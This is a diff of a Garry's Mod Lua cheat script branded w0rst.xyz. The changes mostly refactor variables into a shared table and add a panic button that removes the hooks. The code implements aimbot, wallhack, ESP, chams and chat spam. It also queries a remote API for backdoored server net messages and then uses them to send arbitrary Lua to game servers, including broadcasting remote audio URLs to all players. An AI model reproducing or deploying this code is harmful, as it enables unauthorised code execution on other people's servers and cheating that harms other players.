@@ -14,6 +14,7 @@ end
 local RefreshHook = wtf.gString()
 local AimbotHook = wtf.gString()
 local VisualHook = wtf.gString()
+local CameraHook = wtf.gString()
 local ThinkHook = wtf.gString()
 local TickHook = wtf.gString()
 local ChatHook = wtf.gString()
@@ -24,7 +25,7 @@ local KeyHook = wtf.gString()
 local SelectedNet = "NONE"
 local SelectedPlr = "NONE"
 
-local enable = {
+wtf.enable = {
     ['Ent3DBox'] = false,
     ['FlashSpam'] = false,
     ['PhyRainbow'] = false,
@@ -49,7 +50,7 @@ local enable = {
     ['SilentLock'] = false
 }
 
-local color = {
+wtf.color = {
     ['Tracer'] = Color(255, 255, 255),
     ['Distance'] = Color(255, 255, 255),
     ['Name'] = Color(255, 255, 255),
@@ -63,12 +64,7 @@ local color = {
     ['Fov'] = Color(255, 255, 255)
 }
 
-local binds = { 
-    ['Aimbot'] = 81,
-    ['Menu'] = 72
-}
-
-local responses = {
+wtf.responses = {
     "w0rst.xyz - best gmod cheat 2021",
     "w0rst.xyz - go register or black",
     "w0rst.xyz - free aimbot + esp",
@@ -88,6 +84,11 @@ local responses = {
     "w0rst.xyz - wmenu what??",
     "w0rst.xyz - little fishes take the bait",
     "w0rst.xyz - owned by a non ratted cheat"
+}
+
+wtf.binds = { 
+    ['Aimbot'] = 81,
+    ['Menu'] = 72
 }
 
 local function Relay()
@@ -119,55 +120,55 @@ hook.Add("Think", InfoHook, function()
     Relay()
 end)
 
-function wtf.CheckNet(str)
+local function CheckNet(str)
     return (_G.util.NetworkStringToID(str) > 0)
 end
 
-function wtf.CheckPlr(plr)
+local function CheckPlr(plr)
     if (plr ~= "NONE" and Player(plr):IsValid() ~= false) then
         SelectedPlr = plr; return true
     else
-        wtf.Log("Player Not Selected/Valid")
-        wtf.conoutRGB("PLAYER INVALID OR NOT SELECTED")
+        Log("Player Not Selected/Valid")
+        conoutRGB("PLAYER INVALID OR NOT SELECTED")
     end
 end
 
-function wtf.CheckWebNets()
+local function CheckWebNets()
     http.Post("https://w0rst.xyz/api/net/view.php", { A0791AfFA0F30EdCee1EdADb = "02C2C6A1Ded7183AeDAA8650" }, function(b)
         local Nets = string.Split(b, " ")
         for k,v in pairs(Nets) do
-            if wtf.CheckNet(v) then
-                wtf.Log("Net Found: "..v)
-                wtf.conoutRGB("NET: "..v)
+            if CheckNet(v) then
+                Log("Net Found: "..v)
+                conoutRGB("NET: "..v)
                 SelectedNet=v
             end
         end
     end)
 end
 
-function wtf.AddNet(str)
+local function AddNet(str)
     local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
     http.Post("https://w0rst.xyz/api/net/upload.php", { username=UserInfo[1], password=UserInfo[2], net=str }, function(b)
           if b[1] == "0" then
-              wtf.Log("Uploaded Net "..str)
+              Log("Uploaded Net "..str)
           elseif b[1] == "1" then
-              wtf.Log("Incorrect Permissions")
+              Log("Incorrect Permissions")
           end
     end)
 end
 
-function wtf.SendLua(lua)
-    if wtf.CheckNet(SelectedNet) then
+local function SendLua(lua)
+    if CheckNet(SelectedNet) then
         _G.net.Start(SelectedNet)
         _G.net.WriteString(lua)
         _G.net.WriteBit(1)
         _G.net.SendToServer()
     else
-        wtf.Log("Net Not Selected"); wtf.conoutRGB("Error: Net Not Selected")
+        Log("Net Not Selected"); conoutRGB("Error: Net Not Selected")
     end
 end
 
-wtf.Icons, wtf.Materials = {
+local Icons, Materials = {
     V="https://w0rst.xyz/script/images/visuals.png",
     P="https://w0rst.xyz/script/images/players.png",
     B="https://w0rst.xyz/script/images/backdoor.png",
@@ -177,7 +178,7 @@ wtf.Icons, wtf.Materials = {
     E="https://w0rst.xyz/script/images/exploits.png"
 }, {}
 
-function wtf.Download(filename, url, callback, errorCallback)
+local function Download(filename, url, callback, errorCallback)
     local path = "w0rst/images/" .. filename
     local dPath = "data/" .. path
     if (file.Exists(path, "DATA")) then return callback(dPath) end
@@ -193,29 +194,29 @@ function wtf.Download(filename, url, callback, errorCallback)
     end, errorCallback)
 end
 
-function wtf.IconSet(iconUrls, path, cb)
+local function IconSet(iconUrls, path, cb)
     local set = {}
     local count = 0
     local iconAmt = table.Count(iconUrls)
 
     for name, url in pairs(iconUrls) do
-        wtf.Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
+        Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
             set[name] = Material(path, "unlitgeneric"); count = count + 1
         if (count == iconAmt and cb) then cb(set) end
     end)
 end return set
 end
 
-function wtf.Map(tbl, fn)
+local function Map(tbl, fn)
   	local new = {}
   	for k, v in pairs(tbl) do
     		new[k] = fn(v, k, tbl)
     end return new
 end
 
-wtf.Materials = wtf.IconSet(wtf.Icons, "")
-wtf.IconSet(wtf.Map(wtf.Icons, function(v) return end), "",
-function(icons) for k, icon in pairs(icons) do wtf.Icons[k].iconMat = icon end end)
+Materials = IconSet(Icons, "")
+IconSet(Map(Icons, function(v) return end), "",
+function(icons) for k, icon in pairs(icons) do Icons[k].iconMat = icon end end)
 
 surface.CreateFont('Font', {
     font = 'Open Sans', extended = false, size = 20,
@@ -233,7 +234,7 @@ surface.CreateFont('Sounds', {
     shadow = true, additive = true, outline = true,
 })
 
-function wtf.conoutRGB(str)
+local function conoutRGB(str)
 	local text = {}
 	for i = 1, #str do
   		table.insert(text, HSVToColor(i * math.random(2, 10) % 360, 1, 1 ))
@@ -277,7 +278,7 @@ hook.Add("RenderScene", RenderHook, function(vOrigin, vAngle, vFOV )
     return true
 end)
 
-function wtf.Log(str)
+local function Log(str)
     local Frame=vgui.Create("DFrame")
     Frame:SetSize(220,30)
     Frame:SetPos(-300, LogPosY)
@@ -332,6 +333,32 @@ Tab.Paint = function(self, w, h)
     surface.SetDrawColor(Color(15,15,15,255))
     surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
     draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
+end
+
+Panic=vgui.Create("DButton", Menu)
+Panic:SetSize(20, 20)
+Panic:SetPos(625, 5)
+Panic:SetText("O")
+Panic.Paint = function(self, w,h) 
+    local rainbow = HSVToColor((CurTime() * 99) % 360, 1, 1)
+    self:SetColor(Color(rainbow.r, rainbow.g, rainbow.b, 175))
+end
+Panic.DoClick = function()
+    Menu:Close(); table.Empty(wtf)
+    hook.Remove("Tick", TickHook)
+    hook.Remove("Think", KeyHook)
+    hook.Remove("Think", InfoHook)
+    hook.Remove("Think", ThinkHook)
+    hook.Remove("Think", RefreshHook)
+    hook.Remove("CalcView", ViewHook)
+    hook.Remove("CreateMove", ViewHook)
+    hook.Remove("CreateMove", ChatHook)
+    hook.Remove("CreateMove", BhopHook)
+    hook.Remove("CalcView", CameraHook)
+    hook.Remove("CreateMove", CameraHook)
+    hook.Remove("CreateMove", AimbotHook)
+    hook.Remove("AltHUDPaint", VisualHook)
+    hook.Remove("RenderScene", RenderHook)
 end
 
 local Background=vgui.Create("HTML", Tab)
@@ -632,11 +659,11 @@ local function CreateColorSlider(name, color, tab, x, y)
     return external
 end
 
-local VisualsTab = CreateTabButton(wtf.Materials.V, 13, 5)
-local MiscTab = CreateTabButton(wtf.Materials.M, 13, 85)
-local PlayersTab = CreateTabButton(wtf.Materials.P, 13, 165)
-local BackdoorTab = CreateTabButton(wtf.Materials.B, 13, 245)
-local SoundsTab = CreateTabButton(wtf.Materials.S, 13, 325)
+local VisualsTab = CreateTabButton(Materials.V, 13, 5)
+local MiscTab = CreateTabButton(Materials.M, 13, 85)
+local PlayersTab = CreateTabButton(Materials.P, 13, 165)
+local BackdoorTab = CreateTabButton(Materials.B, 13, 245)
+local SoundsTab = CreateTabButton(Materials.S, 13, 325)
 
 local PlayerPanel = CreatePanel(PlayersTab[1], 495, 540, 10, 10)
 local SoundPanel = CreatePanel(SoundsTab[1], 495, 505, 10, 10)
@@ -647,17 +674,17 @@ local EntOffPanel = CreatePanel(EntityPanel[1], 230, 330, 10, 10)
 local EntOnPanel = CreatePanel(EntityPanel[1], 230, 330, 250, 10)
 
 local ColorSliders = {
-    CreateColorSlider("Tracer-Editor", color['Tracer'], MiscTab[1], 9, 280),
-    CreateColorSlider("Distance-Editor", color['Distance'], MiscTab[1], 134, 280),
-    CreateColorSlider("Name-Editor", color['Name'], MiscTab[1], 259, 280),
-    CreateColorSlider("Weapon-Editor", color['Weapon'], MiscTab[1], 384, 280),
-    CreateColorSlider("Box-2D-Editor", color['Box2D'], MiscTab[1],  9, 370),
-    CreateColorSlider("Box-3D-Editor", color['Box3D'], MiscTab[1], 134, 370),
-    CreateColorSlider("Skeleton-Editor", color['Skeleton'], MiscTab[1], 259, 370),
-    CreateColorSlider("Chams-Editor", color['Chams'], MiscTab[1], 384, 370),
-    CreateColorSlider("Entity-Editor", color['Entity'], MiscTab[1], 9, 460),
-    CreateColorSlider("Fov-Editor", color['Fov'], MiscTab[1], 134, 460),
-    CreateColorSlider("Name/Dist-Editor", color['NameDist'], MiscTab[1], 259, 460)
+    CreateColorSlider("Tracer-Editor", wtf.color['Tracer'], MiscTab[1], 9, 280),
+    CreateColorSlider("Distance-Editor", wtf.color['Distance'], MiscTab[1], 134, 280),
+    CreateColorSlider("Name-Editor", wtf.color['Name'], MiscTab[1], 259, 280),
+    CreateColorSlider("Weapon-Editor", wtf.color['Weapon'], MiscTab[1], 384, 280),
+    CreateColorSlider("Box-2D-Editor", wtf.color['Box2D'], MiscTab[1],  9, 370),
+    CreateColorSlider("Box-3D-Editor", wtf.color['Box3D'], MiscTab[1], 134, 370),
+    CreateColorSlider("Skeleton-Editor", wtf.color['Skeleton'], MiscTab[1], 259, 370),
+    CreateColorSlider("Chams-Editor", wtf.color['Chams'], MiscTab[1], 384, 370),
+    CreateColorSlider("Entity-Editor", wtf.color['Entity'], MiscTab[1], 9, 460),
+    CreateColorSlider("Fov-Editor", wtf.color['Fov'], MiscTab[1], 134, 460),
+    CreateColorSlider("Name/Dist-Editor", wtf.color['NameDist'], MiscTab[1], 259, 460)
 }
 
 local EntList = {}
@@ -739,9 +766,9 @@ local function PopulatePlayers()
             self:SetTextColor(Color(255,255,255))
         end
         LabelButton.DoClick = function()
-            if wtf.CheckPlr(v:UserID()) then
-                wtf.Log("Player: "..Player(SelectedPlr):Nick().." Selected")
-                wtf.conoutRGB("SELECTED PLAYER: "..Player(SelectedPlr):Nick())
+            if CheckPlr(v:UserID()) then
+                Log("Player: "..Player(SelectedPlr):Nick().." Selected")
+                conoutRGB("SELECTED PLAYER: "..Player(SelectedPlr):Nick())
             end
         end
 
@@ -802,7 +829,7 @@ local function CreateBDServer(name, func)
         if SelectedNet ~= "NONE" then 
             func()
         else 
-            wtf.Log("No Net Selected")
+            Log("No Net Selected")
          end
     end
     Button.Paint = function(self, w,h)
@@ -821,12 +848,12 @@ local function CreateBDClient(name, func)
     Button:SetPos(12, BDClientPosY)
     Button:SetText(name)
     Button.DoClick = function()
-        if wtf.CheckNet(SelectedNet) then
-            if wtf.CheckPlr(SelectedPlr) then
+        if CheckNet(SelectedNet) then
+            if CheckPlr(SelectedPlr) then
                 func()
             end
         else
-            wtf.Log("No Net Selected")
+            Log("No Net Selected")
         end
     end
     Button.Paint = function(self, w,h)
@@ -874,11 +901,11 @@ local function CreateSoundButtons()
             self:SetTextColor(Color(155,155,155))
         end
         Button.DoClick = function()
-            if wtf.CheckNet(SelectedNet) then
-                wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..Song[2]..[[','mono',function(station) station:Play() end)")]])
-                wtf.Log("Sent Sound: "..Song[1]); wtf.conoutRGB("PLAYED SOUND: "..Song[1])
+            if CheckNet(SelectedNet) then
+                SendLua([[BroadcastLua("sound.PlayURL(']]..Song[2]..[[','mono',function(station) station:Play() end)")]])
+                Log("Sent Sound: "..Song[1]); conoutRGB("PLAYED SOUND: "..Song[1])
             else
-                wtf.Log("No Net Selected"); wtf.conoutRGB("NO NET SELECTED")
+                Log("No Net Selected"); conoutRGB("NO NET SELECTED")
             end
         end
         SoundPosX=SoundPosX+158
@@ -895,15 +922,15 @@ local function SetBind(bind)
     BlankFrame:SetTitle("")
     BlankFrame.Paint = nil
 
-    wtf.Log("Press Any Button")
+    Log("Press Any Button")
     BlankFrame.Think = function()
         for i = 1, 103 do 
             if input.IsKeyDown(i) then
                 if i == 70 then i = 0 end
-                binds[bind] = i
+                wtf.binds[bind] = i
                 BlankFrame:Close()
                 BlankFrame.Think = nil
-                wtf.Log(bind.." Bind Set "..i)
+                Log(bind.." Bind Set "..i)
             end
         end
     end
@@ -920,7 +947,7 @@ local function CreateBindableButton(name, bind, tab, x, y)
         draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
         surface.SetDrawColor(40, 40, 40, 255)
         surface.DrawOutlinedRect(0,0, w, h)
-        draw.SimpleText("["..binds[bind].."]", "DermaDefault", 84, 5.15, Color(255,255,255,255))
+        draw.SimpleText("["..wtf.binds[bind].."]", "DermaDefault", 84, 5.15, Color(255,255,255,255))
     end
 
     local Button = vgui.Create("DButton", Frame)
@@ -934,22 +961,19 @@ local function CreateBindableButton(name, bind, tab, x, y)
     end
 end
 
-local FreeCamera = {
-    ['SetView'] = false
-}
-
+local FreeCamera = {}
 FreeCamera.ViewOrigin = Vector(0,0,0)
 FreeCamera.ViewAngle = Angle(0,0,0)
 FreeCamera.Velocity = Vector(0,0,0)
-FreeCamera.Hook = wtf.gString()
+FreeCamera.SetView = false
 FreeCamera.Speed = .97
 
 function FreeCamera.CalcView(ply, origin, angles, fov)
-    if not enable['FreeCamera'] then return end
-    if FreeCamera['SetView'] then
+    if not wtf.enable['FreeCamera'] then return end
+    if FreeCamera.SetView then
         FreeCamera.ViewOrigin = origin
         FreeCamera.ViewAngle = angles
-        FreeCamera['SetView'] = false
+        FreeCamera.SetView = false
     end
     return {
         origin = FreeCamera.ViewOrigin,
@@ -958,7 +982,7 @@ function FreeCamera.CalcView(ply, origin, angles, fov)
 end
 
 function FreeCamera.CreateMove(cmd)
-    if not enable['FreeCamera'] then return end
+    if not wtf.enable['FreeCamera'] then return end
     local time, sensitivity = FrameTime(), 0.025
     FreeCamera.ViewOrigin = FreeCamera.ViewOrigin + (FreeCamera.Velocity * time)
     FreeCamera.Velocity = FreeCamera.Velocity * FreeCamera.Speed
@@ -985,8 +1009,8 @@ function FreeCamera.CreateMove(cmd)
     cmd:SetUpMove(0)
 end
 
-hook.Add("CalcView", FreeCamera.Hook, FreeCamera.CalcView)
-hook.Add("CreateMove", FreeCamera.Hook, FreeCamera.CreateMove)
+hook.Add("CalcView", CameraHook, FreeCamera.CalcView)
+hook.Add("CreateMove", CameraHook, FreeCamera.CreateMove)
 
 local chams01 = CreateMaterial("a", "VertexLitGeneric", {
     ["$ignorez"] = 1,
@@ -1012,11 +1036,11 @@ wtf.Bones = {
 
 local FovCircle = { 80 }
 hook.Add("AltHUDPaint", VisualHook, function()
-    if enable['Aimbot'] then
-        surface.DrawCircle(ScrW()/2, ScrH()/2, (FovCircle[1] * 6), color['Fov'])
+    if wtf.enable['Aimbot'] then
+        surface.DrawCircle(ScrW()/2, ScrH()/2, (FovCircle[1] * 6), wtf.color['Fov'])
     end
 
-    if enable['SpectatorList'] then
+    if wtf.enable['SpectatorList'] then
         local SpectatorPos = 10
         for k, v in pairs(player.GetAll()) do
             if IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == LocalPlayer() then
@@ -1031,87 +1055,87 @@ hook.Add("AltHUDPaint", VisualHook, function()
         if ent:IsValid() and ent ~= LocalPlayer() and not ent:IsDormant() then
             for k, v in pairs(EntList) do
                 if v == ent:GetClass() and ent:GetOwner() ~= LocalPlayer() then
-                    if enable['EntName'] and enable['EntDistance'] then
+                    if wtf.enable['EntName'] and wtf.enable['EntDistance'] then
                         local name = ent:GetClass()
                         local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                         local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
-                        draw.SimpleText(name.." ["..distance.."]", "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                        draw.SimpleText(name.." ["..distance.."]", "Default", position.x, position.y, wtf.color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                     end
 
-                    if enable['EntName'] then
-                        if not enable['EntDistance'] then
+                    if wtf.enable['EntName'] then
+                        if not wtf.enable['EntDistance'] then
                             local name = ent:GetClass()
                             local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
-                            draw.SimpleText(name, "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                            draw.SimpleText(name, "Default", position.x, position.y, wtf.color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                         end
                     end
 
-                    if enable['EntDistance'] then
-                        if not enable['EntName'] then
+                    if wtf.enable['EntDistance'] then
+                        if not wtf.enable['EntName'] then
                             local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                             local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
-                            draw.SimpleText(distance, "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                            draw.SimpleText(distance, "Default", position.x, position.y, wtf.color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                         end
                     end
 
-                    if enable['Ent3D'] then
+                    if wtf.enable['Ent3D'] then
                         local Position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                         local eyeangles = ent:EyeAngles()
                         local min, max = ent:WorldSpaceAABB()
                         local origin = ent:GetPos()
                         cam.Start3D()
-                            render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, color['Entity'] )
+                            render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, wtf.color['Entity'] )
                         cam.End3D()
                     end
                 end
             end
 
             if ent:IsPlayer() and ent:Alive() and ent:Health() > 0 then
-                if enable['Tracer'] then
-                    surface.SetDrawColor(color['Tracer'])
+                if wtf.enable['Tracer'] then
+                    surface.SetDrawColor(wtf.color['Tracer'])
                     surface.DrawLine(ScrW()/2, ScrH(), ent:GetPos():ToScreen().x, ent:GetPos():ToScreen().y)
                 end
 
-                if enable['Name'] and enable['Distance'] then
+                if wtf.enable['Name'] and wtf.enable['Distance'] then
                     local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                     local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
-                    draw.SimpleText(ent:Nick().." ["..distance.."]", "Default", position.x, position.y, color['NameDist'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                    draw.SimpleText(ent:Nick().." ["..distance.."]", "Default", position.x, position.y, wtf.color['NameDist'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                 end
 
-                if enable['Distance'] then
-                    if not enable['Name'] then
+                if wtf.enable['Distance'] then
+                    if not wtf.enable['Name'] then
                         local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                         local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
-                        draw.SimpleText(distance, "Default", position.x, position.y, color['Distance'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                        draw.SimpleText(distance, "Default", position.x, position.y, wtf.color['Distance'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                     end
                 end
 
-                if enable['Name'] then
-                    if not enable['Distance'] then
+                if wtf.enable['Name'] then
+                    if not wtf.enable['Distance'] then
                         local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
-                        draw.SimpleText(ent:Nick(), "Default", position.x, position.y, color['Name'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
+                        draw.SimpleText(ent:Nick(), "Default", position.x, position.y, wtf.color['Name'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                     end
                 end
 
-                if enable['Weapon'] then
+                if wtf.enable['Weapon'] then
                     if ent:GetActiveWeapon():IsValid() then
                         local weapon_name=ent:GetActiveWeapon():GetPrintName()
                         local Position = (ent:GetPos() + Vector(0,0,-15)):ToScreen()
-                        draw.SimpleText(weapon_name, "Default", Position.x, Position.y, color['Weapon'], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
+                        draw.SimpleText(weapon_name, "Default", Position.x, Position.y, wtf.color['Weapon'], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
                     end
                 end
 
-                if enable['Box2D'] then
+                if wtf.enable['Box2D'] then
                     local min, max = ent:GetCollisionBounds()
                     local pos = ent:GetPos()
                     local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
                     local middle = bottom.y - top.y
                     local width = middle / 2.425
-                    surface.SetDrawColor(color['Box2D'])
+                    surface.SetDrawColor(wtf.color['Box2D'])
                     surface.DrawOutlinedRect(bottom.x - width, top.y, width * 1.85, middle)
                 end
 
-                if enable['Skeleton'] then
+                if wtf.enable['Skeleton'] then
                     local Continue = true
                     local Bones = {}
 
@@ -1122,7 +1146,7 @@ hook.Add("AltHUDPaint", VisualHook, function()
                     end
 
                     if Continue then
-                        surface.SetDrawColor(color['Skeleton'])
+                        surface.SetDrawColor(wtf.color['Skeleton'])
                         surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
                         surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
                         surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
@@ -1136,24 +1160,24 @@ hook.Add("AltHUDPaint", VisualHook, function()
                     end
                 end
 
-                if enable['Box3D'] then
+                if wtf.enable['Box3D'] then
                     local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                     local eyeangles = ent:EyeAngles()
                     local min, max = ent:WorldSpaceAABB()
                     local origin = ent:GetPos()
 
                     cam.Start3D()
-                        render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, color['Box3D'])
+                        render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, wtf.color['Box3D'])
                     cam.End3D()
                 end
 
-                if enable['Wallhack'] then
+                if wtf.enable['Wallhack'] then
                     cam.Start3D()
                         ent:DrawModel()
                     cam.End3D()
                 end
 
-                if enable['Chams'] then
+                if wtf.enable['Chams'] then
                     local entitym = FindMetaTable("Entity")
                     local weapon = ent:GetActiveWeapon()
 
@@ -1166,18 +1190,18 @@ hook.Add("AltHUDPaint", VisualHook, function()
                     if weapon:IsValid() then
                         cam.Start3D()
                             render.MaterialOverride(chams01)
-                            render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255, color['Chams'].a)
+                            render.SetColorModulation(wtf.color['Chams'].r/255, wtf.color['Chams'].g/255, wtf.color['Chams'].b/255, wtf.color['Chams'].a)
                             entitym.DrawModel(weapon)
-                            render.SetColorModulation(color['Chams'].r/170, color['Chams'].g/170, color['Chams'].b/170, color['Chams'].a)
+                            render.SetColorModulation(wtf.color['Chams'].r/170, wtf.color['Chams'].g/170, wtf.color['Chams'].b/170, wtf.color['Chams'].a)
                             render.MaterialOverride(chams02)
                             entitym.DrawModel(weapon)
                         cam.End3D()
 
                         cam.Start3D()
                             render.MaterialOverride(chams01)
-                            render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255, color['Chams'].a)
+                            render.SetColorModulation(wtf.color['Chams'].r/255, wtf.color['Chams'].g/255, wtf.color['Chams'].b/255, wtf.color['Chams'].a)
                             entitym.DrawModel(ent)
-                            render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255, color['Chams'].a)
+                            render.SetColorModulation(wtf.color['Chams'].r/255, wtf.color['Chams'].g/255, wtf.color['Chams'].b/255, wtf.color['Chams'].a)
                             render.MaterialOverride(chams02)
                             entitym.DrawModel(ent)
                             render.SetColorModulation(1, 1, 1)
@@ -1190,7 +1214,7 @@ hook.Add("AltHUDPaint", VisualHook, function()
 end)
 
 hook.Add("CreateMove", AimbotHook, function(cmd)
-    if not enable['Aimbot'] then return end
+    if not wtf.enable['Aimbot'] then return end
     local ply = LocalPlayer()
 
     local function Valid(ent)
@@ -1217,13 +1241,13 @@ hook.Add("CreateMove", AimbotHook, function(cmd)
             local plrpos = ent:GetPos():ToScreen()
             local distance = math.Round(ent:GetPos():Distance(ply:GetPos()))
             if (plrpos.x >= ScrW()/2 - (FovCircle[1] * 6) and plrpos.x <= ScrW()/2 + (FovCircle[1] * 6)) and (plrpos.y >= ScrH()/2 - (FovCircle[1] * 6) and plrpos.y <= ScrH()/2 + (FovCircle[1] * 6)) then
-                if (input.IsKeyDown(binds['Aimbot']) or binds['Aimbot'] == 0) then 
+                if (input.IsKeyDown(wtf.binds['Aimbot']) or wtf.binds['Aimbot'] == 0) then 
                     if distance < last then 
                         closest = GetEntPos(ent)
                     end; last = distance
                     
                     cmd:SetViewAngles(closest)
-                    if enable['AutoFire'] then
+                    if wtf.enable['AutoFire'] then
                         cmd:SetButtons(IN_ATTACK)
                     end
                 end
@@ -1234,8 +1258,8 @@ end)
 
 local SilentAngles = nil
 hook.Add("CreateMove", ViewHook, function(cmd)
-    if not enable['SilentLock'] then return end
-    if (input.IsKeyDown(binds['Aimbot']) or binds['Aimbot'] == 0) and enable['Aimbot'] then
+    if not wtf.enable['SilentLock'] then return end
+    if (input.IsKeyDown(wtf.binds['Aimbot']) or wtf.binds['Aimbot'] == 0) and wtf.enable['Aimbot'] then
         SilentAngles = (SilentAngles or cmd:GetViewAngles()) + Angle(cmd:GetMouseY() * 0.023, cmd:GetMouseX() * -0.023, 0)
     else
         SilentAngles = cmd:GetViewAngles()
@@ -1243,7 +1267,7 @@ hook.Add("CreateMove", ViewHook, function(cmd)
 end)
 
 hook.Add("CalcView", ViewHook, function(ply, pos, angles, fov)
-    if not enable['SilentLock'] then return end
+    if not wtf.enable['SilentLock'] then return end
     local view = {}
     view.angles = SilentAngles
     view.drawviewer = false
@@ -1253,13 +1277,13 @@ hook.Add("CalcView", ViewHook, function(ply, pos, angles, fov)
 end)
 
 hook.Add("Think", ThinkHook, function()
-    if not enable['PhysRainbow'] then return end
+    if not wtf.enable['PhysRainbow'] then return end
     local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
     LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
 end)
 
 hook.Add("CreateMove", BhopHook, function(ply) 
-    if not enable['Bhop'] then return end
+    if not wtf.enable['Bhop'] then return end
     if(ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
         ply:RemoveKey(IN_JUMP);
         if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
@@ -1279,182 +1303,182 @@ local ChatSpamDelay = 0
 hook.Add("CreateMove", ChatHook, function()
     if CurTime() < ChatSpamDelay then return end
     ChatSpamDelay = CurTime() + 0.025
-    if enable['ChatSpam'] then
+    if wtf.enable['ChatSpam'] then
         if engine.ActiveGamemode() == 'darkrp' then
-            LocalPlayer():ConCommand("say".." /ooc "..responses[math.random(1, table.Count(responses))])
+            LocalPlayer():ConCommand("say".." /ooc "..wtf.responses[math.random(1, table.Count(wtf.responses))])
         else
-            LocalPlayer():ConCommand("say".." "..responses[math.random(1, table.Count(responses))])
+            LocalPlayer():ConCommand("say".." "..wtf.responses[math.random(1, table.Count(wtf.responses))])
         end
     end
 end)
 
 local IsKeyDown = false
 hook.Add("Think", KeyHook, function()
-    if input.IsKeyDown(binds['Menu']) and not Menu:IsVisible() and not IsKeyDown then
+    if input.IsKeyDown(wtf.binds['Menu']) and not Menu:IsVisible() and not IsKeyDown then
         Menu:Show(); IsKeyDown=true
-    elseif input.IsKeyDown(binds['Menu']) and Menu:IsVisible() and not IsKeyDown then
+    elseif input.IsKeyDown(wtf.binds['Menu']) and Menu:IsVisible() and not IsKeyDown then
        Menu:Hide(); IsKeyDown=true
-    elseif not input.IsKeyDown(binds['Menu']) then
+    elseif not input.IsKeyDown(wtf.binds['Menu']) then
         IsKeyDown=false
     end
 end)
 
 hook.Add("Tick", TickHook, function()
-    if enable['UseSpam'] then
+    if wtf.enable['UseSpam'] then
         timer.Simple(0.05, function() RunConsoleCommand("+use") end)
         timer.Simple(0.10, function() RunConsoleCommand("-use") end)
     end
 
-    if enable['FlashSpam'] then
+    if wtf.enable['FlashSpam'] then
         LocalPlayer():ConCommand("impulse 100")
     end
 end)
 
 CreateCheckbox("Plr-Tracer", VisualsTab[1], 22, 10, function()
-    enable['Tracer'] = not enable['Tracer']
-    if enable['Tracer'] then
-        wtf.Log("Tracer Enabled")
+    wtf.enable['Tracer'] = not wtf.enable['Tracer']
+    if wtf.enable['Tracer'] then
+        Log("Tracer Enabled")
     else
-        wtf.Log("Tracer Disabled")
+        Log("Tracer Disabled")
     end
 end)
 
 CreateCheckbox("Plr-Distance", VisualsTab[1], 142, 10, function()
-    enable['Distance'] = not enable['Distance']
-    if enable['Distance'] then
-        wtf.Log("Distance Enabled")
+    wtf.enable['Distance'] = not wtf.enable['Distance']
+    if wtf.enable['Distance'] then
+        Log("Distance Enabled")
     else
-        wtf.Log("Distance Disabled")
+        Log("Distance Disabled")
     end
 end)
 
 CreateCheckbox("Plr-Names", VisualsTab[1], 262, 10, function()
-    enable['Name'] = not enable['Name']
